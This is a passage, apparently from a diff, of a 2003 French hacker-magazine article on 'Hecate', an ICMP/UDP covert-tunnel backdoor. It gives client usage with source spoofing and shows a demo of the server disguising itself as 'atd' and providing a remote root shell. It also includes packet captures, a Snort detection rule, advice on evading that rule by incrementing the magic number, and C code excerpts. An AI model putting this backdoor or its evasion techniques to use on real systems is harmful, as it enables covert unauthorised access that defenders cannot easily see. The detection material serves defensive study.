+paquet réponse ne lui parvient avant expiration du delai, le client
+concidère le serveur comme down.
+
+
+
+[ Options du Server ]
+
+J'écris option au singulier, car pour le server, la seule option
+disponnible est -m<magic_num> qui permet de spécifier la valeur
+du magic_num. Le server ne tiendra compte que des datagrames UDP
+provenant d'un port source égal à 'magic_num' et des datagrames
+ICMP ayant 'magic_num' comme numéro de séquence. Si vous attribuez
+une valeur particulère à 'magic_num' au lançement du server, vous
+devrez spécifier la même valeur au magic_num du client.
+
+
+
+
+	2. Syntaxe :
+	____________
+
+
+
+Selon les options fournies :
+
+	a. ./client -p icmp -t www.toto-is-back.com
+	b. ./client -p 17 -t www.toto.com -s 123.1.2.3
+	c. ./client -p udp -t 146.25.68.117 -d 777
+	d. ./client -p 1 -t www.toto.com -m 13317
+	e. ./client -p udp -t www.toto.com -w 10
+	f. ./client -p udp -t www.toto.com -m 555 -d 777
+
+nos commandes seront transmises par :
+
+	a. des PINGs à ce cher toto avec un seqnum 666
+	b. des dgrams UDP avec 123.1.2.3 comme adresse source
+	c. des dgrams UDP au port 777 avec un port source de 666
+	d. des PINGs avec un seqnum valant 13317
+	e. des dgrams UDP avec un timeout fixé à 10 secondes
+	f. des dgrams UDP émis du port 555 à destination du port 777.
+
+
+
+
+[ Au Prompt ]
+
+Au prompt, tapez '?' pour obtenir un menu d'aide, 'quit' pour fermer
+le client, et 'turnoff' pour killer le server et fermer le client.
+Au prompt du client vous pouvez entrer presque toutes les commandes
+shell, comme si vous étiez en connexion telnet/ssh/R*.
+Cependant, N'UTILISEZ PAS les étideurs vi, pico, et cie ... dans ce
+cas le serveur passe la main à l'éditeur, et ne répond plus, vous
+êtes bloqués, impossible de le manoeuvrer encore avec le client.
+
+
+
+
+
+
+	3. Démonstration :
+	__________________
+
+
+Voici ce que ça donne en local, client/serveur sur la même machine.
+Test réalisé par Emepr0r :
+
+
+[root@neptune emepr0r]# ./daemon
+-+ ICMP/UDP Tunnel - IOC Team, 2003 +-
+server hiding itself in background
+[root@neptune emepr0r]# ps -aux | grep daemon
+[root@neptune emepr0r]# ps -aux | grep atd
+root	3591  0.0  1.0  1686  656 pts/3	    R	      23:45	0:00 atd
+[root@neptune emepr0r]# ./client -v -p icmp -t neptune
+-+ ICMP/UDP Tunnel - IOC Team, 2003 +-
+interactive shell, root priviliges allowed
+using ICMP ...
+hecate ~1# ls -al
+PING sent to 127.0.0.1
+PONG recieved from 127.0.0.1
+total 112
+drwxrwxr-x    2 emper0r  emper0r      4096 jun  1 14:39 .
+drwxr-xr-x   16 emper0r  emper0r      4096 mai 29 23:24 ..
+-rwxr-xr-x    1 root     root        21198 jun  1 14:39 client
+-rw-r--r--    1 emper0r  emper0r      6098 jun  1 14:39 client.c
+-rw-r--r--    1 emper0r  emper0r     10369 mai 31 16:02 hecate.h
+-rw-r--r--    1 root     root         4681 mai 27 22:57 projet.05-05-2003.tar.gz
+-rw-rw-r--    1 emper0r  emper0r      6771 mai 31 15:33 projet.30-05-2003.tar.gz
+-rwxr-xr-x    1 root     root        20646 jun  1 14:39 server
+-rw-rw-r--    1 emper0r  emper0r      4725 jun  1 14:22 server.c
+-rw-rw-r--    1 emper0r  emper0r       136 mai  5 14:22 todo
+hecate ~2# turnoff
+turning server off,
+2 Packets(s) Sent, 1 Packet(s) Recieved
+closing client, bye.
+[root@neptune emper0r]#
+
+
+
+
+
+
+
+		++++ | Part IV.  Les Tests | ++++
+
+
+
+Hecate a été testé sous Redhat 9.0 et versions antérieures, ainsi
+que sur Mandrake 9.1. Les tests se sont déroulés sur des interfaces
+lo, eth et ppp. Nous avons utilisé Tcpdump  www.tcpdump.org  pour
+examnier le trafic et regarder le contenu des paquets.
+
+
+
+	1. Le Dialogue PING/PONG :
+	__________________________
+
+
+Si je me ping en local, j'obtiens avec tcpdump :
+
+tcpdump: listening on lo
+23:54:37 067163 neolab > neolab: icmp: echo request (DF) (ttl 64, id 0, len 84)
+23:54:37 067195 neolab > neolab: icmp: echo reply (ttl 255, id 9831, len 84)
+
+
+Maintenant, en utilisant hecate en local, avec l'ICMP :
+
+tcpdump: listening on lo
+23:54:38 627164 neolab > neolab: icmp: echo request (DF) (ttl 64, id 6372, len 31)
+23:54:38 067195 neolab > neolab: icmp: echo reply (ttl 255, id 9832, len 31)
+23:54:38 067356 neolab > neolab: icmp: echo reply (ttl 64, id 3526, len 164)
+
+On voit deux echo reply pour un echo request. Le 2nd PONG est enfait émis par le
+kernel qui répond au PING du client hecate. Le PONG retourné par le serveur est
+lui d'une taille plus importante (len 164) puisqu'il contient l'affichage retour.
+
+
+
+
+	2. Avec UDP :
+	_____________
+
+
+neloab#  ./client -p udp -t 127.0.0.1 -d 777
+-+ ICMP/UDP Crypted Tunneling Tool  -by IOC Team, 2003 +-
+Using UDP ...
+[hecate ~1]# ls
+client
+client.c
+hecate.h
+server
+server.c
+etc ...
+[hecate ~2]#
+
+et en sniffant:
+neolab#  tcpdump -i lo udp -X
+
+22:16:49.033186 localhost.localdomain.666 > localhost.localdomain.777: udp 2808 (DF)
+0x0000	 4500 001f 0000 4000 4011 3ccc 7f00 0001	E.....@.@.<.....
+0x0010	 7f00 0001 029a 0309 0b00 0000 cdd2 ab  	...............
+22:16:49.042124 localhost.localdomain.666 > localhost.localdomain.56401: udp 27640
+0x0000	 4500 0080 5037 0000 ff11 6d33 7f00 0001	E...P7....m3....
+0x0010	 7f00 0001 029b dc51 6c00 0000 c2cd c8c4	.......Ql.......
+0x0020	 cfd5 abc2 cdc8 c4cf d58f c2ab c9c4 c2c0	................
+0x0030	 d5c4 8fc9 abc8                         	......
+
+Dans l'exemple le port de destination de la requette a été fixé à 777,
+sinon, il est aléatoire.
+
+
+
+
+
+
+
+	3. Test sur eth0 :
+	__________________
+
+
+Test réalisé par Emepr0r :
+
+La machine A 192.168.0.1 execute le serveur et la machine B 192.168.0.4
+le client. Aprés avoir lancé le serveur sur A, je lance le client sur B.
+
+# ./client -t 192.168.0.1 -p icmp
+-+ ICMP/UDP Crypted Tunnel - IOC Team, 2003 +-
+interactive shell, root priviliges allowed
+using ICMP ...
+hecate ~1# ls -al
+total 64
+drwxrwxr-x    2 emper0r  emper0r      4096 jun  2 15:01 .
+drwx--x--x   38 emper0r  emper0r      4096 jun  2 15:00 ..
+-rwxrwxr-x    1 emper0r  emper0r     18524 jun  2 14:55 a.out
+-rw-r--r--    1 emper0r  emper0r      7987 jun  1 22:05 client.c
+-rw-r--r--    1 root     root            0 jun  2 15:03 dump
+-rw-r--r--    1 emper0r  emper0r      9971 jun  1 21:31 hecate.h
+-rw-rw-r--    1 emper0r  emper0r      7293 jun  2 14:54
+projet.01-06-2003.newupdate.tar.gz
+-rw-rw-r--    1 emper0r  emper0r      5178 jun  1 21:31 server.c
+hecate ~2# turnoff
+turning server off
+2 Packet(s) sent, 1 Packet(s) recieved
+closing client, Bye.
+
+
+Dump a partir de la machine A :
+# tcpdump -i eth0 -X -m -N
+15:03:42.827674 192.168.0.4 > 192.168.0.1: icmp: echo request (DF)
+0x0000   4500 0023 0000 4000 4001 b984 c0a8 0004        E..#..@.@.......
+0x0010   c0a8 0001 0800 0000 0000 029a cdd2 818c        ................
+0x0020   c0cd ab00 0000 0000 0000 0000 0000             ..............
+
+15:03:42.852931 192.168.0.1 > 192.168.0.4: icmp: echo reply (DF)
+0x0000   4500 0233 0000 4000 4001 b774 c0a8 0001        E..3..@.@..t....
+0x0010   c0a8 0004 0000 0000 0000 029a d5ce d5c0        ................
+0x0020   cd81 9795 abc5 d3d6 d9d3 d6d9 d38c d981        ................
+0x0030   8181 8193 81c4 ccd1 c4d3 91d3 8181 c4cc        ................
+0x0040   d1c4 d391 d381 8181 8181 8195 9198 9781        ................
+0x0050   cbd4
+
+
+Dump a partir de la machine B :
+# tcpdump -i eth0 -X -m -N
+tcpdump: listening on eth0
+14:59:17.375955 192.168.0.4 > 192.168.0.1: icmp: echo request (DF)
+0x0000   4500 0023 0000 4000 4001 b984 c0a8 0004        E..#..@.@.......
+0x0010   c0a8 0001 0800 0000 0000 029a cdd2 818c        ................
+0x0020   c0cd ab
+                                       ...
+14:59:17.401852 192.168.0.1 > 192.168.0.4: icmp: echo reply (DF)
+0x0000   4500 0233 0000 4000 4001 b774 c0a8 0001        E..3..@.@..t....
+0x0010   c0a8 0004 0000 0000 0000 029a d5ce d5c0        ................
+0x0020   cd81 9795 abc5 d3d6 d9d3 d6d9 d38c d981        ................
+0x0030   8181 8193 81c4 ccd1 c4d3 91d3 8181 c4cc        ................
+0x0040   d1c4 d391 d381 8181 8181 8195 9198 9781        ................
+
+15:00:09.347805 192.168.0.4 > 192.168.0.1: icmp: echo request (DF)
+0x0000   4500 0024 0000 4000 4001 b983 c0a8 0004        E..$..@.@.......
+0x0010   c0a8 0001 0800 0000 0000 029a d5d4 d3cf        ................
+0x0020   cec7 c7ab                                      ....
+
+
+
+
+
+
+	4. Le Cryptage :
+	________________
+
+
+Voici un dump des paquets émis par une version antérieure d'hecate
+suivi d'un dump des paquets de la version implémentant le cryptage.
+Le test était effecuté en local, et la commande était 'finger' :
+
+
+Avant cryptage:
+
+20:59:35.965480 neolab > neolab: icmp: echo request (DF) (ttl 64, id 0, len 55)
+0x0000	 4500 0037 0000 4000 4001 3cc4 7f00 0001	E..7..@.@.<.....
+0x0010	 7f00 0001 0800 0000 0000 029a 6669 6e67	............fing
+0x0020	 6572 0a00 0000 0000 0000 0000 0000 0000	er..............
+0x0030	 0000 0000 0000                         	......
+[...]
+20:59:36.127889 neolab > neolab: icmp: echo reply (DF) (ttl 64, id 0, len 307)
+0x0000	 4500 0133 0000 4000 4001 3bc8 7f00 0001	E..3..@.@.;.....
+0x0010	 7f00 0001 0000 0000 0000 029a 4c6f 6769	............Logi
+0x0020	 6e20 2020 2020 4e61 6d65 2020 2020 2020	n.....Name......
+0x0030	 2054 7479 2020                         	.Tty..a
+
+
+
+Après cryptage:
+
+22:28:21.663582 neolab > neolab: icmp: echo request (DF) (ttl 64, id 0, len 35)
+0x0000	 4500 0023 0000 4000 4001 3cd8 7f00 0001	E..#..@.@.<.....
+0x0010	 7f00 0001 0800 0000 0d96 029a c3cc cbc2	................
+0x0020	 c0d7 af                                	...
+[...]                               	...
+22:28:21.733587 neolab > neolab: icmp: echo reply (DF) (ttl 64, id 0, len 366)
+0x0000	 4500 016e 0000 4000 4001 3b8d 7f00 0001	E..n..@.@.;.....
+0x0010	 7f00 0001 0000 0000 0d51 029a e9ca c2cc	.........Q......
+0x0020	 cb85 8585 8585 ebc4 c8c0 8585 8585 8585	................
+0x0030	 85f1 d1dc 8585                         	......
+
+
+On voit trés clairement que la commande comme l'affichage retour qui
+étaient visibles avant ne le sont plus depuis que le cryptage est utilisé.
+J'ai délibérement oté des lignes cï-dessus la réponse PONG du kernel.
+
+
+
+
+
+
+
+	5. Détection :
+	______________
+
+
+Emper0r m'a montré une règle de l'IDS snort permettant de détecter
+l'utilisation d'hecate sur son réseau :
+
+    alert icmp $HOME_NET any -> $EXTERNAL_NET any (msg:"BACKDOOR HECATE";
+    classtype:misc-activity; itype:0; icmp_id:0; icode:0; icmp_seq:666;)
+
+
+# cat /var/log/snort/alert
+[**] [1:0:0] BACKDOOR HECATE [**]
+[Classification: Misc activity] [Priority: 3]
+06/02-17:35:45.158369 192.168.0.1 -> 192.168.0.4
+ICMP TTL:64 TOS:0x0 ID:0 IpLen:20 DgmLen:101 DF
+Type:0  Code:0  ID:0  Seq:666  ECHO REPLY
+
+
+
+Il s'agit simplement ici de détecter un seqnum 666. Donc on ne va détecter
+que notre trafic ICMP backdooré. On pourrait étendre ça à l'UDP avec un
+check du port source. Biensur, vu comme ça, c'est pas une protection terrible,
+puisque ça ne marche plus si on utilise une autre valeur. Mais imaginez un IDS
+(et ça doit se trouver) qui donne l'alerte s'il détecte un trafic étrange, comme
+l'utilisation d'un même port source plusieurs fois de suite, ou des ICMP seqnum
+identiques fréquement échangés ...
+
+La solution serait ne pas avoir deux datagrames similaires, d'opter pour une
+construction de paquets trés différents. Comment ? en utilisant des valeurs
+aléatoires pour les champs id, seqnum, source, dest ...
+Pour id et dest c'est faisable, mais n'oublions pas que les autres champs
+nous servent à différencier nos paquets du trafic régulier.
+
+Si on demande au client de forger un datagrame ICMP avec un seqnum aléatoire,
+le serveur à l'autre bout ne saura pas quelle valeur nous avons attribué à
+ce seqnum, et ne saura par quel seqnum est désigné le bon datagrame. Donc
+si le seqnum de même que le port source UDP sont générés aléatoirement,
+il sera impossible de faire dialoguer le client avec le serveur.
+
+
+
+
+	6. Incrémentation :
+	___________________
+
+
+Une solution serait donc d'incrémenter le magic_num  régulièrement, en
+partant d'un magic_num de base. On incrémenterait ensuite le magic_num
+ainsi :   magic_num += i;
+
+
+[ Fonctionnement ]
+
+Il nous faut définir des règles de fonctionnement, une marche à suivre pour
+ne pas se mélanger les pinceaux. Ces règles seront les suivantes :
+
+
+	1. Le Client émet un paquet avec magic_num et incrémente magic_num.
+	   Le Client s'attend donc à reçevoir un paquet avec magic_num + i
+
+	2. Le Server reçoit un magic_num et l'incrémente. Il émet donc un
+	   magic_num + i et s'attend à recevoir un magic_num + 2i.
+
+	3. Si aucours du dialogue, le server recoit un paquet avec un
+	   magic_num
+
+Ce troisième point permet d'éviter un problème. En effet, si le server
+s'attendait à recevoir un magic_num + 10i par exemple, et que le client
+était redémarré, pour utiliser un autre protocol, il recommençerait à
+envoyer la valeur de base du magic_num, et non magic_num +9i ce qui
+l'empecherait de communiquer. Donc dansi un tel cas de figure, la valeur
+du magic_num est réinitialisée.
+
+
+
+[ En pratique ]
+
+Désolé si mes propos sont confus, mais en voici l'utilité en pratique.
+Puisque nous avons un magic_num incrémenté à chaque paquet, cela donne
+un port source ou un icmp seqnum différent d'un paquet à l'autre.
+
+Voici un Dump en utilisant udp et un port source incrémenté en prenant
+comme valeur de base la valeur par défaut 666 :
+
+22:22:28.091932 127.0.0.1.666 > 127.0.0.1.17767: udp 2040 (DF) (ttl 64, id 0, len 29)
+22:22:28.099059 127.0.0.1.671 > 127.0.0.1.17767: udp 2040 (DF) (ttl 64, id 0, len 28)
+22:22:28.106819 127.0.0.1.671 > 127.0.0.1.2132: udp 2040 (DF) (ttl 64, id 0, len 28)
+22:22:28.291524 127.0.0.1.676 > 127.0.0.1.9158: udp 2040 (DF) (ttl 64, id 0, len 29)
+22:22:28.297754 127.0.0.1.681 > 127.0.0.1.9158: udp 2040 (DF) (ttl 64, id 0, len 28)
+22:22:28.470823 127.0.0.1.686 > 127.0.0.1.39017: udp 2040 (DF) (ttl 64, id 0, len 29)
+22:22:28.477028 127.0.0.1.691 > 127.0.0.1.39017: udp 2040 (DF) (ttl 64, id 0, len 28)
+22:22:28.629612 127.0.0.1.696 > 127.0.0.1.18547: udp 2040 (DF) (ttl 64, id 0, len 29)
+
+On voit que le port source des datagrams est incrémenté de 5 et 5 tandis que le
+port de destination est aléatoire. Au passage, ici le header IP est forgé par le
+kernel car l'adresse source n'est pas spoofée, ce qui a pour conséquence visibles
+dans ce dump, les ttl 64 et le champ id laissé à 0.
+
+Lorsqu'on quitte le client, puis qu'on l'exécute à nouveau, le serveur distant
+s'attend à recevoir un paquet avec un magic_num incrémenté dans la suite logique
+des paquets qu'il a reçu juste avant. Or on vient de relançer le server avec
+une valeur de base, et le magic_num du client ne correspond plus à celui du
+serveur. Voici ce qui se passe :
+
+
+22:22:28.635228 127.0.0.1.701 > 127.0.0.1.18547: udp 2040 (DF) (ttl 64, id 0, len 28)
+22:22:28.830121 127.0.0.1.706 > 127.0.0.1.56401: udp 2040 (DF) (ttl 64, id 0, len 29)
+22:22:28.836168 127.0.0.1.711 > 127.0.0.1.56401: udp 2040 (DF) (ttl 64, id 0, len 28)
+22:22:29.028915 127.0.0.1.716 > 127.0.0.1.23807: udp 2040 (DF) (ttl 64, id 0, len 29)
+22:22:29.035551 127.0.0.1.721 > 127.0.0.1.23807: udp 2040 (DF) (ttl 64, id 0, len 28)
+22:22:38.239215 127.0.0.1.666 > 127.0.0.1.17767: udp 2040 (DF) (ttl 64, id 0, len 29)   <= ici on a redémarré le client
+22:22:38.246272 127.0.0.1.671 > 127.0.0.1.10232: udp 2040 (DF) (ttl 64, id 0, len 28)
+22:22:38.254296 127.0.0.1.671 > 127.0.0.1.37962: udp 2040 (DF) (ttl 64, id 0, len 28)
+22:22:38.259728 127.0.0.1.676 > 127.0.0.1.8987: udp 2040 (DF) (ttl 64, id 0, len 28)
+22:22:38.264885 127.0.0.1.681 > 127.0.0.1.22764: udp 2040 (DF) (ttl 64, id 0, len 28)
+
+Dans ce cas de figure, lorsque le serveur reçoit un magic_num de base, ici 666
+par défaut, il reset le compteur, et recommençe à incrémenter à partir de celui-ci.
+On voit que le dialogue reprend avec une incrémentation régulière. On voit également
+que ça déconne au premier paquet reçu (requete et réponse émises avec le même port
+source 671). Il faut en effet un premier échange de paquets pour que les deux magic_num
+client et serveur se synchronisent.
+
+
+Comme on est curieux, on va regarder ce qui se passe lorsque la valeur du
+magic_num incrémenté dépasse 65536. On incrémente pour l'exemple de 5 en 5 :
+
+22:23:30.052001 127.0.0.1.65525 > 127.0.0.1.17767: udp 2040 (DF) (ttl 64, id 0, len 29)
+22:23:30.058674 127.0.0.1.65530 > 127.0.0.1.17767: udp 2040 (DF) (ttl 64, id 0, len 28)
+22:23:30.298256 127.0.0.1.65535 > 127.0.0.1.9158: udp 2040 (DF) (ttl 64, id 0, len 29)
+22:23:30.303937 127.0.0.1.4 > 127.0.0.1.9158: udp 2040 (DF) (ttl 64, id 0, len 28)
+22:23:30.503833 127.0.0.1.9 > 127.0.0.1.39017: udp 2040 (DF) (ttl 64, id 0, len 29)
+22:23:30.509529 127.0.0.1.14 > 127.0.0.1.39017: udp 2040 (DF) (ttl 64, id 0, len 28)
+22:23:30.694597 127.0.0.1.19 > 127.0.0.1.18547: udp 2040 (DF) (ttl 64, id 0, len 29)
+22:23:30.700159 127.0.0.1.24 > 127.0.0.1.18547: udp 2040 (DF) (ttl 64, id 0, len 28)
+22:23:30.893475 127.0.0.1.29 > 127.0.0.1.56401: udp 2040 (DF) (ttl 64, id 0, len 29)
+
+une fois que 65536 est atteint, le magic_num repart de 0, et le dialogue se
+poursuit. De toute manière, à moins de spécifier un magic_num de base genre
+"-m 65525" comme j'ai fait pour l'exemple, ça devrait pas arriver souvent.
+
+
+
+[ Le code ]
+
+Le code a été un peu modifié, enfait quelques compteurs bien plaçés auront suffit.
+Voici un extrait du client :
+
+
+
+-------8<-----------------------------------------------------------------------
+	/*
+	 * SEND UDP DGRAM
+	 */
+	if(proto == IPPROTO_UDP)
+	{
+		if((send_UDP(dest_port, src_port, server_addr, client_addr, crypted_cmd, spoof)) == -1){
+			perror("send_UDP()");
+			return -1;
+		}
+
+		magic_num +=i;
+		src_port = magic_num;
+
+-------8<-----------------------------------------------------------------------
+
+Pour l'UDP le server envoit le magic_num comme source, puis il l'incrémente.
+Il réagiera donc à un datagrame ayant le magic_num envoyé + i.
+
+Pour le serveur et l'ICMP même chose :
+
+-------8<-----------------------------------------------------------------------
+
+	/* reset magic_num counter */
+	if(icmp->seq == htons(base_num))
+		magic_num = base_num;
+
+	if(icmp->type == ICMP_ECHO && icmp->seq == htons(magic_num))
+	{
+		magic_num+=i;
+		seqnum = magic_num;
+
+		/* ... */
+
+		send_ICMP(ICMP_ECHOREPLY, seqnum, client_addr, server_addr, crypted_data, 0);
+
+		magic_num+=i;
+		seqnum = magic_num;
+	}
+-------8<-----------------------------------------------------------------------
+
+Le magic_num reçu en seqnum est incrémenté, on PONG avec la nouvelle valeur,
+et on incrémente à nouveau.
+
+
+
+
+
+
+
+			A N N E X E
+			___________
+
+Vous trouverez  le code complet  hecate.v1.0.tar.gz  joint à ce mag.
+Vous trouverz également cette archive sur notre site, probablement,
+rootshell.be/~ioc/releases tant que rootshell est pas down.
+Attention, N'UTILISEZ PAS cet outil afin de backdoorer une autre
+machine que la votre, vous êtes seuls responsables de ce que vous
+ferez de ce code.
+
+
+[ See also ]
+
+[+]- 007Shell.c	v.1.0 by FuSy
+[+]- CRH#9 by Team CodeZero, 11th May 1998
+
+
+
+
+
+Conclusion :
+____________
+
+Je voudrais remercier dans le désordre pour l'idée, le code, les conseils,
+la doc et les tests : Emper0r, MeiK, Li0n7, Ins (A poil !!), Ciel, Anonymous,
+ce bon vieux toto, ainsi que ceux qui auraient testé le code pour nous et
+dont j'aurais oublié le pseudo.
+
+Voila ... le dernier article auquel j'aurais pris part pour IOC Magazine,
+ce numéro étant probablement le dernier de la série. Ca fait bizzare, ce
+fut bien sympa en tout cas ...  A une prochaine fois !
+
+
+
+
